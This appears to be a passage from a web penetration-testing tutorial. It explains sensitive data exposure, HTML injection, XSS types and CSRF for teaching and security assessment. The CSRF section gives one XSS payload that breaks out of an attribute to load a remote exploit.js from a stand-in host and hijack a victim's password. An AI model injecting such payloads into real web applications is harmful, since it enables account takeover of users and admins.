# Sensitive Data Exposure
[Sensitive Data Exposure](https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure) refers to the availability of sensitive data in clear-text to the end-user. This is usually found in the `source code` of the web page or page source on the front end of web applications.
Sometimes we may find login `credentials`, `hashes`, or other sensitive data hidden in the comments of a web page's source code or within external `JavaScript` code being imported. Other sensitive information may include exposed links or directories or even exposed user information, all of which can potentially be leveraged to further our access within the web application or even the web application's supporting infrastructure (webserver, database server, etc.).
For this reason, one of the first things we should do when assessing a web application is to review its page source code to see if we can identify any 'low-hanging fruit', such as exposed credentials or hidden links.

# HTML Injection
[HTML injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection) occurs when unfiltered user input is displayed on the page. This can either be through retrieving previously submitted code, like retrieving a user comment from the back end database, or by directly displaying unfiltered user input through `JavaScript` on the front end.
Another example of `HTML Injection` is web page defacing. This consists of injecting new `HTML` code to change the web page's appearance, inserting malicious ads, or even completely changing the page. This type of attack can result in severe reputational damage to the company hosting the web application.

# Cross-Site Scripting (XSS)
`HTML Injection` vulnerabilities can often be utilized to also perform [Cross-Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/) attacks by injecting `JavaScript` code to be executed on the client-side. Once we can execute code on the victim's machine, we can potentially gain access to the victim's account or even their machine. `XSS` is very similar to `HTML Injection` in practice. However, `XSS` involves the injection of `JavaScript` code to perform more advanced attacks on the client-side, instead of merely injecting HTML code. There are three main types of `XSS`:

| Type            | Description                                                                                                                               |
| --------------- | ----------------------------------------------------------------------------------------------------------------------------------------- |
| `Reflected XSS` | Occurs when user input is displayed on the page after processing (e.g., search result or error message).                                  |
| `Stored XSS`    | Occurs when user input is stored in the back end database and then displayed upon retrieval (e.g., posts or comments).                    |
| `DOM XSS`       | Occurs when user input is directly shown in the browser and is written to an `HTML` DOM object (e.g., vulnerable username or page title). |

# Cross-Site Request Forgery (CSRF)
`CSRF` attacks may utilize `XSS` vulnerabilities to perform certain queries, and `API` calls on a web application that the victim is currently authenticated to. This would allow the attacker to perform actions as the authenticated user. It may also utilize other vulnerabilities to perform the same functions, like utilizing HTTP parameters for attacks.
A common `CSRF` attack to gain higher privileged access to a web application is to craft a `JavaScript` payload that automatically changes the victim's password to the value set by the attacker. Once the victim views the payload on the vulnerable page (e.g., a malicious comment containing the `JavaScript` `CSRF` payload), the `JavaScript` code would execute automatically. It would use the victim's logged-in session to change their password. Once that is done, the attacker can log in to the victim's account and control it.
`CSRF` can also be leveraged to attack admins and gain access to their accounts. Admins usually have access to sensitive functions, which can sometimes be used to attack and gain control over the back-end server (depending on the functionality provided to admins within a given web application). Following this example, instead of using `JavaScript` code that would return the session cookie, we would load a remote `.js` (`JavaScript`) file, as follows:
```
"><script src=//www.example.com/exploit.js></script>
```
The `exploit.js` file would contain the malicious `JavaScript` code that changes the user's password. Developing the `exploit.js` in this case requires knowledge of this web application's password changing procedure and `APIs`. The attacker would need to create `JavaScript` code that would replicate the desired functionality and automatically carry it out (i.e., `JavaScript` code that changes our password for this specific web application).
